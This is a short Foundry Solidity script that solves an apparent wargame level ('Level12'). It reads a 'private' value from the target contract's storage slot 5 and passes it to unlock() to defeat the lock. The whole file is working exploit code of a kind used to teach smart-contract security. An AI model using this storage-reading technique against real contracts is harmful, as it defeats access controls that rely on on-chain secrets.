// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level12.sol";

contract AttackerScript is Script {
    Level12 public level12 = Level12(0x7EfD28Ba5B3Dba6f515cE2D97bAee35CaD42E57d);
    bytes32 public value;

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      //Get the storage 5 with cast (check readme), why 5? Explanation on smart contract
      // check layout storage doc here : https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
      value = 0x1e56e2b6d8a72c4ce38ec4f86d0dfb4e6d4ec5e92009618503624dce7dc2efda;
      level12.unlock(bytes16(value));
      console2.log(level12.locked());
      vm.stopBroadcast();
    }
}
